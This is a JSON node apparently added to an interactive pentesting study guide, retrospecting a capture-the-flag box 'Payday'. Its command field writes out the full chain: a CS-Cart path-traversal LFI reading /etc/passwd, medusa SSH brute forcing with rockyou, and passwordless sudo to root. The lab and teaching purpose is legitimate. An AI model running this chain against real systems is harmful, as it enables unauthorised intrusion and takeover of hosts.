@@ -1,0 +1,42 @@
+{
+  "id": "payday_lessons",
+  "phase": "MINDSET",
+  "title": "Payday Retrospective — Six Lessons from an LFI-to-Root Chain",
+  "body": "Payday was a linear, old-school Linux box: CS-Cart LFI leaked a username, SSH brute force cracked it, and a passwordless sudo misconfig handed over root. Rough timeline: LFI-to-shell ~30 min, but a self-inflicted detour on the SSH brute force burned far longer than it should have. End to end the intended path is short — the lessons are about not fighting the wrong tool and reading the box's own signals. Chain: CS-Cart LFI (?classes_dir=../../../etc/passwd%00) -> username 'patrick' -> medusa SSH brute (patrick:patrick) -> LinEnum flags passwordless sudo -> sudo /bin/bash -> root.\n\nLESSON 1 - The username's SOURCE is the hint. patrick came from an LFI /etc/passwd read. When you pull a username from a file-read like that, it's there to be used - that username plus a common wordlist is often the whole foothold. Don't overthink it - patrick:patrick fell in the first few hundred rockyou lines.\n\nLESSON 2 - When a brute tool throws a kex/MAC error, the tool can't speak the server's crypto - SWITCH TOOLS, don't fight flags. hydra's libssh literally cannot negotiate legacy MACs (hmac-md5/sha1); no flag fixes it. medusa negotiated fine. Tool-hopping to make a brute 'faster' is a smell, but tool-switching to get past a protocol wall is correct - know the difference.\n\nLESSON 3 - The version banners tell you the box's age, and age dictates technique. nmap showed OpenSSH 4.6p1, Apache 2.2.4, PHP 5.2.3 - all circa-2007. The %00 null byte working in the LFI confirmed PHP < 5.3.4. Ancient stack = legacy crypto (which explained the SSH MAC wall) and means dated, well-documented exploits are in play. Read the version numbers in your scan before deciding an approach won't work; old software changes what's viable.\n\nLESSON 4 - The PHPMailer fatal error was a RED HERRING. The page threw 'Class PHPMailer not found' - tempting to chase CVE-2016-10033 RCE. But that's just CS-Cart's bundled mailer erroring; it was not the vector. Shiny error messages aren't always the path - verify a lead is actually your vector before committing to it.\n\nLESSON 5 - sudo -l (or LinEnum's sudo check) is the FIRST post-foothold move on Linux. LinEnum flagged 'we can sudo without supplying a password' immediately. Passwordless sudo is one of the most common and fastest Linux privesc wins - check it before anything fancier.\n\nLESSON 6 - Eight open ports (SSH/HTTP/POP3/IMAP/SMB) is noise; the chain only used two (80 for the LFI, 22 for the shell). Enumerate everything, but don't feel obligated to attack everything. Pop3/imap/smb were there to distract. Identify the intended path and commit once you see it.",
+  "cmd": "# ── Payday chain, reproducible ──\n# 1) LFI in CS-Cart leaks the user (note the %00 null byte = old PHP < 5.3.4)\ncurl 'http://$ip/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../etc/passwd%00'\n#   -> patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash\n\n# 2) Brute SSH with the leaked username. hydra dies on legacy MAC -> use medusa.\nmedusa -h $ip -u patrick -P /usr/share/wordlists/rockyou.txt -M ssh -t 4\n#   -> patrick:patrick\n\n# 3) Log in (legacy crypto - see ssh_only for the ~/.ssh/config block)\nssh patrick@$ip\n\n# 4) First privesc check, every time:\nsudo -l\n#   -> (ALL) NOPASSWD: ... or just runnable without a password\n\n# 5) Passwordless sudo = instant root\nsudo /bin/bash\n#   root@payday:/#  -> done\n\n# Meta: the nmap version banners (OpenSSH 4.6 / PHP 5.2.3) flagged a legacy box.\n# Read the versions before deciding an approach won't work - age dictates technique.",
+  "warn": "The two biggest time-sinks on Payday were self-inflicted: fighting hydra's libssh instead of switching to medusa, and chasing the PHPMailer error instead of recognizing the legacy stack made brute viable. When a tool can't speak a protocol, switch tools; when an error looks shiny, check whether it's actually your vector before committing.",
+  "choices": [
+    {
+      "label": "Apply the SSH brute / legacy-crypto chain on a new box",
+      "next": "ssh_only"
+    },
+    {
+      "label": "Apply LFI /etc/passwd enumeration on a new box",
+      "next": "lfi"
+    },
+    {
+      "label": "Check passwordless sudo on a Linux foothold",
+      "next": "sudo_check"
+    },
+    {
+      "label": "Run the full Linux post-exploit enum flow",
+      "next": "linux_post_exploit"
+    },
+    {
+      "label": "Stuck mid-engagement — methodology reset",
+      "next": "mindset_stuck"
+    },
+    {
+      "label": "Pre-exam mindset checklist",
+      "next": "mindset_preexam"
+    },
+    {
+      "label": "Back to lessons hub",
+      "next": "jump_lessons"
+    },
+    {
+      "label": "Back to start (new box)",
+      "next": "start"
+    }
+  ]
+}
